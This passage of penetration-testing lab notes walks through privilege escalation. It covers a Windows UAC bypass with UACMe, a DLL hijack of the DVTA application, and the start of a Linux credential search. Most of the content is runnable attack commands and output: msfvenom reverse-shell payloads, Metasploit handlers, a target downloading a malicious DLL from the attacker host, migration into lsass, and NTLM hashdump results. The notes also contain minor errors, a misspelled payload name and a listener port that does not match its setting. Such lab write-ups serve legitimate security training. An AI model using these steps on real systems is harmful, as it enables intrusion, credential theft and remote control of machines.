_Attempt to dump password hashes to verify access levels._

`hashdump`:
```
[-] 2007: Operation failed: The parameter is incorrect. ←
```

_Attempt to escalate privileges using common techniques._

`getsystem`:
```
[-] 2001: Operation failed: Access is denied. The following was attempted: ←
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
```

**Explanation:** Both attempts to dump hashes and escalate privileges fail, confirming that UAC is blocking full administrative access.

_Migrate the Meterpreter session to `explorer.exe` to stabilize the session and prepare for UAC bypass._

`migrate -N explorer.exe`:
```
[*] Migrating from 2540 to 2836...
[*] Migration completed successfully. ←
```

**Explanation:** Migrating to `explorer.exe`, a more stable process, ensures that the session remains active during the UAC bypass attempt.

_Background the current session and prepare for UAC bypass using UACMe._

`background`

The admin user is a member of the Administrators group. However, we do not have the high
privilege as of now. We can gain high privilege by Bypassing UAC (User Account Control).

We are going to bypass the UAC for admin user with the help of UACMe tool.

<span style="color: #e57373;">**Attacker machine**</span>.

_Set up a Metasploit handler to catch the reverse shell that will be generated after bypassing UAC._

`search multi/handler`, `use exploit/multi/handler`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set LHOST 10.10.46.4`, `set LPORT 5555`, `exploit -j`:
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.46.4:5555 ←
```

_Generate a reverse shell payload that will be executed after UAC bypass._

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.46.4 LPORT=5555 -f exe -o /root/Desktop/reverse_shell.exe`:
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: /root/Desktop/reverse_shell.exe ←
```

**Explanation:** The payload is saved as an executable file (`reverse_shell.exe`) that will connect back to the handler once executed on the target machine.

_Locate the UACMe tool and prepare to upload it along with the reverse shell to the target machine._

`ls -alps /root/Desktop/tools`:
```
total 60
4 drwxr-xr-x 1 root root 4096 Dec 15  2020 ./
4 drwxr-xr-x 1 root root 4096 Aug 12 23:43 ../
4 drwxr-xr-x 2 root root 4096 Dec  7  2020 Delorean/
4 drwxr-xr-x 3 root root 4096 Dec  7  2020 JohnTheRipper/
4 drwxr-xr-x 1 root root 4096 Dec 15  2020 SharpSploit/
4 drwxr-xr-x 1 root root 4096 Dec 15  2020 UACME/ ←
4 drwxr-xr-x 2 root root 4096 Dec  7  2020 firepwd/
4 drwxr-xr-x 2 root root 4096 Dec  7  2020 ircsnapshot/
4 drwxr-xr-x 2 root root 4096 Dec  7  2020 known_hosts-hashcat/
4 drwxr-xr-x 3 root root 4096 Dec  7  2020 portable/
4 drwxr-xr-x 2 root root 4096 Dec  7  2020 reGeorg/
4 drwxr-xr-x 1 root root 4096 Dec 15  2020 scripts/
4 drwxr-xr-x 1 root root 4096 Dec 15  2020 seatbelt/
4 drwxr-xr-x 1 root root 4096 Dec 10  2020 srtp-decrypt/
4 drwxr-xr-x 2 root root 4096 Dec  7  2020 steganography/
```

`ls -alps /root/Desktop/tools/UACME`:
```
total 204
  4 drwxr-xr-x 1 root root   4096 Dec 15  2020 ./
  4 drwxr-xr-x 1 root root   4096 Dec 15  2020 ../
196 -rw-rw-r-- 1 root root 199168 Dec 10  2020 Akagi64.exe ←
```

**Explanation:** The UACMe tool (`Akagi64.exe`) is found and ready to be uploaded to the target machine for bypassing UAC.

_Interact with the Meterpreter session._

`sessions -i 1`

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Navigate to a writable directory on the target machine to upload the necessary files._

`pwd`:
```
C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

`cd 'C:\Users\admin\AppData\Local\Temp'`

_Upload the reverse shell executable and UACMe tool to the target machine._

`upload /root/Desktop/reverse_shell.exe`:
```
[*] uploading  : /root/Desktop/reverse_shell.exe -> reverse_shell.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/Desktop/reverse_shell.exe -> reverse_shell.exe
[*] uploaded   : /root/Desktop/reverse_shell.exe -> reverse_shell.exe ←
```

`upload /root/Desktop/tools/UACME/Akagi64.exe`:
```
[*] uploading  : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] Uploaded 194.50 KiB of 194.50 KiB (100.0%): /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] uploaded   : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe ←
```

`ls`:
```
Listing: C:\Users\admin\AppData\Local\Temp
==========================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2024-08-12 23:32:39 +0530  1
100777/rwxrwxrwx  199168  fil   2024-08-12 23:52:00 +0530  Akagi64.exe ←
100777/rwxrwxrwx  73802   fil   2024-08-12 23:51:50 +0530  reverse_shell.exe ←
```

**Explanation:** Both the reverse shell executable and the UACMe tool have been successfully uploaded to the target machine’s `Temp` directory.

_Check the system information to determine the appropriate UACMe bypass method._

`sysinfo`:
```
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600). ←
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

**Explanation:** The target is running Windows Server 2012 R2, which is vulnerable to several UAC bypass methods provided by UACMe.

We are going to use UACMe method number 23:
- Author: Leo Davidson derivative
- Type: Dll Hijack
- Method: IFileOperation
- Target(s): \system32\pkgmgr.exe
- Component(s): DismCore.dll
- Implementation: ucmDismMethod
- Works from: Windows 7 (7600)
- Fixed in: unfixed

_Use UACMe to bypass UAC and execute the reverse shell payload with elevated privileges._

`shell`, `Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\reverse_shell.exe`

```
[*] Sending stage (175174 bytes) to 10.4.16.255
[*] Meterpreter session 2 opened (10.10.46.4:5555 -> 10.4.16.255:49330) at 2024-08-12 23:55:27 +0530 ←
```

**Explanation:** UACMe successfully bypasses UAC using method 23 (DLL Hijack via IFileOperation), and the reverse shell payload is executed, opening a new elevated Meterpreter session.

`exit`

`background`

<span style="color: #e57373;">**Attacker machine**</span>.

_Interact with the newly opened elevated session to verify the success of the UAC bypass._

`sessions -i 2`

_Verify the current user to confirm elevated privileges._

`getuid`:
```
Server username: VICTIM\admin ←
```

_Check the available privileges to confirm full control over the system._

`getprivs`:
```
Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreatePermanentPrivilege
SeCreateSymbolicLinkPrivilege
SeCreateTokenPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeLockMemoryPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRelabelPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTcbPrivilege
SeTimeZonePrivilege
SeTrustedCredManAccessPrivilege
SeUndockPrivilege
```

**Explanation:** The session now has all necessary privileges, confirming that UAC has been successfully bypassed.

_Migrate to the `lsass.exe` process to gain access to sensitive information like password hashes._

`migrate -N lsass.exe`:
```
[*] Migrating from 1920 to 512...
[*] Migration completed successfully. ←
```

_Verify that the session has SYSTEM-level privileges after the migration._

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM ←
```

_Dump password hashes from the system to retrieve the admin user’s NTLM hash._

`hashdump`:
```
admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:659c8124523a634e0ba68e64bb1d822f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Explanation:** The `hashdump` command successfully retrieves the NTLM hashes of the admin user and the Administrator account, completing the objective of the lab.

### DLL Hijacking - Theory

#### DLL Hijacking

DLL hijacking is a privilege escalation technique, where an attacker manipulates the way Windows applications load Dynamic Link Libraries (DLLs) to execute malicious code with elevated privileges.

This technique exploits the default search order for DLLs in Windows to replace or inject custom DLLs into an application, leading to privilege escalation.

#### What is DLL Hijacking?

DLL hijacking occurs when an attacker is able to control or influence which DLLs a Windows application loads at runtime.

Windows applications rely on DLLs for various functions, such as accessing system resources, performing tasks, or providing application-specific features.

By manipulating the DLL loading process, an attacker can inject malicious code into an application, potentially leading to privilege escalation.

#### How DLL Hijacking Works

**Default DLL Search Order**
Windows applications use a default search order to locate and load DLLs at runtime.
This order includes several locations, such as the application's directory, system directories, and system-defined paths. If a DLL is not found in the expected location, Windows moves through the search order until it finds the required DLL.

**Exploiting Uncontrolled DLL Loading**
An attacker can exploit this search order by placing a malicious DLL in a location where it will be loaded instead of the legitimate DLL.
If the application runs with elevated privileges, this can lead to privilege escalation.

#### DLL Hijacking Methodology

1. Identify Vulnerable Applications
- **Determine Privileged Applications**: Identify applications or services that run with elevated privileges (e.g., administrator or SYSTEM).
- **Analyze DLL Dependencies**: Examine the application's dependency on specific DLLs and check for cases where these DLLs may not be found in their expected locations.

2. Examine the DLL Search Order
- **Understand Default Search Order**: Windows has a predefined order for searching for DLLs. It generally starts with the application's directory, followed by the system directories, and then other system-defined paths.
- **Identify Potential Insertion Points**: Determine where in the search order an attacker might place a DLL so that it gets loaded by the application. Common locations include:
	- The application's current working directory.
	- The System32 or SysWOW64 directories.
	- Directories listed in the PATH environment variable.
	- Other directories included in the search order.

3. Inject a Malicious DLL
- **Create a Malicious DLL**: The attacker creates a DLL with the same name as a DLL that is missing or not found by the application. This DLL contains the attacker's code or payload.
- **Place the Malicious DLL in a Strategic Location**: Place the DLL in a location where the application is likely to look for it (search order). The goal is for the application to find and load the malicious DLL instead of the legitimate one.

### DLL Hijacking - Lab

#### Lab Environment

A Kali GUI machine and a Windows machine provided to you.
Multi views for the Windows machine access has given to you:
1. Regular user (student).
2. Administrator access for application analysis. 

Your task is to find the Hijackable DLL location from the vulnerable application, which is installed on the windows machine.
Run [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) utility to identify the missing and Hijackable DLL locations in provided vulnerable application then perform privilege escalation from a regular user (student) by planting a malicious DLL to the missing path.

**Note**: Use student machine for all the privilege escalation activities. The Administrator access is only given for analysis and running an application purpose.

DVTA Application Location: `C:\Users\Administrator\Desktop\dvta\bin\Release\DVTA.exe`.

**Objective**: Gain access to administrator privilege Meterpreter session.

#### Lab Solution

<span style="color: #64b5f6;">**Target (victim) machine: `Administrator` privilege**</span>.

_Verify that you are operating with administrator privileges on the target machine._

`whoami`:
```
privilege-escal\administrator ←
```

_Check the privileges associated with the administrator account to understand what actions are permitted._

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

**Explanation:** The `whoami /priv` command shows that the administrator account has several powerful privileges enabled, including `SeDebugPrivilege` and `SeImpersonatePrivilege`, which are essential for many types of privilege escalation techniques.

_Navigate to the desktop directory to locate the installed DVTA application and associated files._

`cd ./Desktop`, `dir`:
```
    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/23/2020   9:18 AM                dvta ←
-a----        9/17/2020   4:30 AM        1180544 Procmon64.exe ←
```

**Explanation:** The `dvta` directory contains the DVTA application, and the `Procmon64.exe` is the Process Monitor utility, which will be used to identify potential DLL hijacking opportunities.

_List the contents of the DVTA application's `Release` directory to see the executable and related DLLs._

`dir ./dvta/bin/Release`:
```
    Directory: C:\Users\Administrator\Desktop\dvta\bin\Release

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/15/2020  11:33 PM           8192 DBAccess.dll
-a----        7/15/2020  11:33 PM          15872 DBAccess.pdb
-a----        7/15/2020  11:33 PM         221696 DVTA.exe ←
-a----        7/15/2020  11:33 PM           1987 DVTA.exe.config
-a----        7/15/2020  11:33 PM          52736 DVTA.pdb
-a----        7/15/2020  11:33 PM          22984 DVTA.vshost.exe
-a----        7/15/2020  11:33 PM           1157 DVTA.vshost.exe.config
-a----        7/15/2020  11:33 PM            479 DVTA.vshost.exe.manifest
-a----        7/15/2020  11:33 PM        1116760 EntityFramework.dll
-a----        7/15/2020  11:33 PM        1120077 EntityFramework.xml
-a----        7/15/2020  11:33 PM         118784 ExcelLibrary.dll
```

**Explanation:** The `Release` directory contains the DVTA executable and several DLLs. Our task is to identify a missing DLL that the DVTA application might attempt to load, which we can then hijack.

_Run the DVTA application and Process Monitor to identify any missing DLLs that the application tries to load._

`./Desktop/dvta/bin/Release/DVTA.exe`

`./Procmon64.exe` > disable `Show Registry Activity`, disable `Show Network Activity`

**Explanation:** Running the DVTA application allows us to monitor its behavior using Process Monitor. By disabling registry and network activities, we focus the output on file operations, specifically looking for missing DLLs.

_Apply filters in Process Monitor to narrow down the results to only show `CreateFile` operations that resulted in `NAME NOT FOUND` for the DVTA.exe process._

`Filter` > `Filter...` > `Process Name is DVTA.exe then Include` > `Add`
`Operation`: `CreateFile` (right-click) > `Include 'CreateFile'`
`Result`: `NAME NOT FOUND` (right-click) > `Include 'NAME NOT FOUND'`

| Time of Day        | Process Name | PID  | Operation  | Path                                                         | Result         |
|--------------------|--------------|------|------------|--------------------------------------------------------------|----------------|
| 8:01:00.3130479 AM | DVTA.exe     | 4352 | CreateFile | C:\Users\Administrator\Desktop\dvta\bin\Release\DWrite.dll ← | NAME NOT FOUND |

**Explanation:** Process Monitor reveals that DVTA.exe attempts to load `DWrite.dll`, but it is not found. This missing DLL can be hijacked by placing a malicious version in the specified path.

<span style="color: #64b5f6;">**Target (victim) machine: `student` privilege**</span>.

_Verify that you are operating with the `student` account on the target machine._

`whoami`:
```
privilege-escal\student ←
```

_Check the permissions on the `Release` directory to ensure the `student` user has write access, which is necessary to plant the malicious DLL._

`Get-Acl 'C:\Users\Administrator\Desktop\dvta\bin\Release' | Format-List`:
```
Path   : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop\dvta\bin\Release\
Owner  : BUILTIN\Administrators
Group  : PRIVILEGE-ESCAL\None
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         PRIVILEGE-ESCAL\Administrator Allow  FullControl
         PRIVILEGE-ESCAL\student Allow  FullControl ←
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         PRIVILEGE-ESCAL\Administrator Allow  FullControl
Audit  :
Sddl   : O:BAG:S-1-5-21-419124378-3330503463-3778973392-513D:AI(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)(A;OICIID;FA;;;S-1-5-21-419124378-3330503463-3778973392-1008)(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICII
         D;FA;;;LA)
```

**Explanation:** The output confirms that the `student` user has `FullControl` over the `Release` directory, meaning the user can write files, including our malicious DLL, to this location.

<span style="color: #e57373;">**Attacker machine**</span>.

_Check the IP configuration to identify the attacker's IP address, which will be needed for the reverse shell payload._

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.9  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:09  txqueuelen 0  (Ethernet)
        RX packets 1735  bytes 159661 (155.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1929  bytes 2170620 (2.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.39.2  netmask 255.255.255.0  broadcast 10.10.39.255 ←
        ether 02:42:0a:0a:27:02  txqueuelen 0  (Ethernet)
        RX packets 17  bytes 1310 (1.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 4615  bytes 20162409 (19.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4615  bytes 20162409 (19.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

_Retrieve the target machine's IP address to confirm connectivity._

`cat /root/Desktop/target`:
```
Target Machine IP Address: : 10.4.26.113 ←
```

_Set up a Metasploit listener to catch the reverse shell connection._

`msfconsole -q`

`search multi/handler`, `use exploit/multi/handler`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set LHOST ...`, `set LPORT 5555`, `exploit -j`:
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.39.2:4444 ←
```

_Create a malicious DLL using `msfvenom` that contains the reverse shell payload._

`msfvenom -p widows/meterpreter/reverse_tcp LHOST=... LPORT=4444 -f dll -o /root/Desktop/DWrite.dll`:
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of dll file: 5120 bytes
Saved as: /root/Desktop/DWrite.dll ←
```

**Explanation:** The `msfvenom` tool generates a malicious `DWrite.dll` file containing a reverse shell payload. When executed, this DLL will connect back to the attacker's machine, providing a Meterpreter session.

_Serve the malicious DLL using a simple HTTP server to make it accessible for download._

`cd /root/Desktop`

`python3 -m http.server 80`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ←
```

**Explanation:** A simple HTTP server is started on port 80 to serve the malicious DLL to the target machine.

<span style="color: #64b5f6;">**Target (victim) machine: `student` privilege**</span>.

_Download the malicious DLL from the attacker's machine and place it in the `Release` directory._

`iwr -UseBasicParsing -Uri 'http://10.10.39.2/DWrite.dll' -OutFile 'C:\Users\Administrator\Desktop\dvta\bin\Release\DWrite.dll'`

**Explanation:** The `Invoke-WebRequest` (`iwr`) command downloads the malicious `DWrite.dll` file from the attacker's machine and saves it to the target directory where DVTA will attempt to load it.

_Verify that the malicious DLL was successfully downloaded and placed in the target directory._

`(dir C:\Users\Administrator\Desktop\dvta\bin\Release\DWrite.dll).LastWriteTime`:
```
Wednesday, August 14, 2024 8:09:51 AM ←
```

<span style="color: #64b5f6;">**Target (victim) machine: `Administrator` privilege**</span>.

_Relaunch the DVTA application to trigger the loading of the malicious DLL._

`dir C:\Users\Administrator\Desktop\dvta\bin\Release`

`./DVTA.exe`

**Explanation:** Running the DVTA application now will cause it to load the malicious `DWrite.dll` file, triggering the reverse shell connection to the attacker's machine.

<span style="color: #e57373;">**Attacker machine**</span>.

_Confirm that the reverse shell connection was successful and a Meterpreter session has been opened._

```
[*] Sending stage (176195 bytes) to 10.4.26.113
[*] Meterpreter session 1 opened (10.10.39.2:4444 -> 10.4.26.113:49793) at 2024-08-14 13:45:01 +0530 ←
```

**Explanation:** The Meterpreter session is successfully opened, indicating that the DLL hijacking was successful and the attacker now has control over the target machine.

_Interact with the Meterpreter session and verify that the session has administrator privileges._

`sessions`, `sessions -i 1`

`getuid`:
```
Server username: PRIVILEGE-ESCAL\Administrator ←
```

_Verify the available privileges to confirm the extent of control over the target machine._

`getprivs`:
```
Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

**Explanation:** The `getprivs` command shows that the Meterpreter session has inherited all of the administrator's privileges, confirming full control over the target machine.

---


## Linux Privilege Escalation

### Locally Stored Credentials - Theory

#### Lab Environment

ABC University primarily teaches web application development classes. The students of the class are given accounts on an Internet facing server so that they can setup all their web application scripts on it. Unfortunately, in the zeal to be helpful, the admin seems to have shared too much with the students. Could this lead to a server compromise? 

**You have managed to crack a student account and get a shell on the server. Your mission is to now escalate your privileges, get a root shell on the server** and retrieve the flag!

#### Lab Solution

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Verify the current user to confirm that you are operating as the "student" user on the target machine._

`whoami`:
```
student ←
```

_Check the groups the current user belongs to, which might provide insight into the user’s privileges._

`groups student`:
```
student : student
```

**Explanation:** The `groups` command confirms that the user only belongs to the `student` group, indicating limited access. However, misconfigurations or sensitive information left on the server could still provide a way to escalate privileges.

_Navigate to the web server’s document root to explore files related to the hosted applications._

`cd /var/www/html`, `ls -alps`:
```
total 328
 4 drwxr-xr-x  1 root root  4096 Sep 24  2018 ./
 4 drwxr-xr-x  1 root root  4096 Sep 24  2018 ../
 4 drwxr-xr-x  4 root root  4096 Jul  1  2018 _data/
 4 -rwxr-xr-x  1 root root  3009 Dec 17  2012 about.php
 8 -rwxr-xr-x  1 root root  5736 Dec 17  2012 action.php
 4 drwxr-xr-x  4 root root  4096 Dec 17  2012 admin/
12 -rwxr-xr-x  1 root root 11310 Dec 17  2012 admin.php
 4 -rwxr-xr-x  1 root root  2446 Dec 17  2012 category.php
16 -rwxr-xr-x  1 root root 16367 Dec 17  2012 comments.php
 4 drwxr-xr-x  2 root root  4096 Dec 17  2012 doc/
 8 -rwxr-xr-x  1 root root  6712 Dec 17  2012 feed.php
 4 drwxr-xr-x  2 root root  4096 Dec 17  2012 galleries/
20 -rwxr-xr-x  1 root root 17368 Dec 17  2012 i.php
 8 -rwxr-xr-x  1 root root  4415 Dec 17  2012 identification.php
 4 drwxr-xr-x  6 root root  4096 Dec 17  2012 include/
12 -rw-r--r--  1 root root 10918 Sep 24  2018 index.html
12 -rwxr-xr-x  1 root root 10418 Dec 17  2012 index.php
 4 drwxr-xr-x  3 root root  4096 Dec 17  2012 install/
16 -rwxr-xr-x  1 root root 15660 Dec 17  2012 install.php
 4 drwxr-xr-x 52 root root  4096 Dec 17  2012 language/
 4 drwxr-xr-x  5 root root  4096 Dec 17  2012 local/
 4 -rwxr-xr-x  1 root root  3971 Dec 17  2012 nbm.php
 8 -rwxr-xr-x  1 root root  4449 Dec 17  2012 notification.php
12 -rwxr-xr-x  1 root root 10690 Dec 17  2012 password.php
28 -rwxr-xr-x  1 root root 28286 Dec 17  2012 picture.php
 4 drwxr-xr-x  6 root root  4096 Dec 17  2012 plugins/
 4 -rwxr-xr-x  1 root root  3266 Dec 17  2012 popuphelp.php
12 -rwxr-xr-x  1 root root 11464 Dec 17  2012 profile.php
 4 -rwxr-xr-x  1 root root  2717 Dec 17  2012 qsearch.php
 4 -rwxr-xr-x  1 root root  3168 Dec 17  2012 random.php
 8 -rwxr-xr-x  1 root root  5356 Dec 17  2012 register.php
 8 -rwxr-xr-x  1 root root  7182 Dec 17  2012 search.php
 8 -rwxr-xr-x  1 root root  7515 Dec 17  2012 search_rules.php
 8 -rwxr-xr-x  1 root root  6523 Dec 17  2012 tags.php
 4 drwxr-xr-x  4 root root  4096 Dec 17  2012 template-extension/
 4 drwxr-xr-x  8 root root  4096 Dec 17  2012 themes/
 4 drwxr-xr-x  4 root root  4096 Dec 17  2012 tools/
16 -rwxr-xr-x  1 root root 14742 Dec 17  2012 upgrade.php
 8 -rwxr-xr-x  1 root root  4344 Dec 17  2012 upgrade_feed.php
20 -rwxr-xr-x  1 root root 19676 Dec 17  2012 ws.php
```

**Explanation:** The web server document root contains many files owned by the root user. Examining these files, especially those related to configuration or installation, may reveal sensitive information such as credentials.

_Search for occurrences of the keyword "username" across the files in the document root to identify where user credentials might be stored._

`grep -nr "username"`:
```
admin.php:184:    'USERNAME' => $user['username'],profile.php:108:      $_POST['username'],profile.php:122:    unset($_POST['username']);profile.php:209:      // username is updated only if allowedprofile.php:210:      if (!empty($_POST['username']))profile.php:212:        if ($_POST['username'] != $userdata['username'] and get_userid($_POST['username']))profile.php:219:          array_push($fields, $conf['user_fields']['username']);profile.php:220:          $data{$conf['user_fields']['username']} = $_POST['username'];profile.php:223:          if ($_POST['username'] != $userdata['username'])
profile.php:230:              get_l10n_args('Your username has been successfully changed to : %s', $_POST['username']),
profile.php:306:      'USERNAME'=>stripslashes($userdata['username']),
_data/templates_c/1jt9buy^%%60^601^601C4607%%no_photo_yet.tpl.php:141:<br><input type="text" name="username">

...

language/ka_GE/common.lang.php:386:$lang['Please enter your username or email address.'] = 'გთხოვთ ჩაწეროთ თქვენი სახელი ან ელ-ფოსტის მისამართი.';
language/ka_GE/common.lang.php:412:$lang['Your username has been successfully changed to : %s'] = 'თქვენი მომხმარებლის სახელი შეიცვალა:  %s -ით';
language/th_TH/common.lang.php:282:$lang['the username must be given'] = "จำเป็นต้องกรอกชื่อผู้ใช้";
language/th_TH/common.lang.php:340:$lang['Invalid username or email'] = 'ชื่อผู้ใช้ หรือ ที่อยู่อีเมล์ไม่ถูกต้อง';
language/th_TH/common.lang.php:353:$lang['Please enter your username or email address.'] = 'กรุณาใส่ชื่อผู้ใช้หรือที่อยู่อีเมลของคุณ.';
language/th_TH/common.lang.php:369:$lang['Your username has been successfully changed to : %s'] = 'ชื่อผู้ใช้งานคุณได้ถูกเปลี่ยนเป็น : %s เรียบร้อยแล้ว';
install.php:355:        'username'     => $admin_name,
install.php:361:        'username'     => 'guest',
```

**Explanation:** The `grep` command searches for instances of "username" across all files within the current directory. This can help pinpoint where usernames are handled, possibly leading to locations where credentials are stored.

_Search for occurrences of the keyword "password" to locate potential password storage or usage locations._

`grep -nr "password"`:
```
his.offsetParent||c.body;while(a&&!cx.test(a.nodeName)&&f.css(a,"position")==="static")a=a.offsetParent;return a})}}),f.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(a,c){var d=/Y/.test(c);f.fn[a]=function(e){return f.access(this,function(a,e,g){var h=cy(a);if(g===b)return h?c in h?h[c]:f.support.boxModel&&h.document.documentElement[e]||h.document.body[e]:a[e];h?h.scrollTo(d?f(h).scrollLeft():g,d?g:f(h).scrollTop()):a[e]=g},a,e,arguments.length,null)}}),f.each({Height:"height",Width:"width"},function(a,c){var d="client"+a,e="scroll"+a,g="offset"+a;f.fn["inner"+a]=function(){var a=this[0];

...

language/th_TH/common.lang.php:351:$lang['Your password has been reset'] = 'รหัสผ่านของคุณได้รับการรีเซ็ตใหม่';
language/th_TH/common.lang.php:354:$lang['You will receive a link to create a new password via email.'] = 'คุณจะได้รับลิงค์เพื่อสร้างรหัสผ่านใหม่ทางอีเมลของคุณ.';
language/th_TH/common.lang.php:356:$lang['Change my password'] = 'เปลี่ยนรหัสผ่านของฉัน';
language/th_TH/common.lang.php:357:$lang['Enter your new password below.'] = 'กำหนดรหัสผ่านใหม่ของคุณด้านล่าง.';
install.php:254:    array_push( $errors, l10n('please enter your password again') );
install.php:271:$conf[\'db_password\'] = \''.$dbpasswd.'\';
install.php:356:        'password'     => md5($admin_pass1),
install.php:468:    if (isset($_POST['send_password_by_mail']))
```

**Explanation:** Similarly, the `grep` command searches for "password" to find where passwords are stored or processed, potentially revealing sensitive information like database credentials.

_Search for the database user configuration to determine if any database credentials are stored in the configuration files._

`grep -nr "db_user"`:
```
admin/include/functions_upgrade.php:322:    $pwg_db_link = pwg_db_connect($conf['db_host'], $conf['db_user'], $conf['db_password'], $conf['db_base']);
i.php:412:  $pwg_db_link = pwg_db_connect($conf['db_host'], $conf['db_user'],
